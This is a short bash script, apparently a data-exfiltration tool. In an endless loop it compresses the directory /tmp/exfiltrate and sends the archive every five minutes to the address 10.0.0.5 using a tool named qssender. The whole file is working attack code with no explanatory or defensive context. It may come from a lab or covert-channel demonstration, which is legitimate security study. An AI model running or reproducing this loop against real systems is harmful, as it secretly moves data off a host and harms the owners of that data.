#!/bin/bash
while :; do
   tar -zcvf /tmp/data.tar.gz /tmp/exfiltrate
  /tmp/qssender send file -d 2 -l 0.0.0.0 -r 10.0.0.5 -s 500 /tmp/data.tar.gz
  sleep 300
done
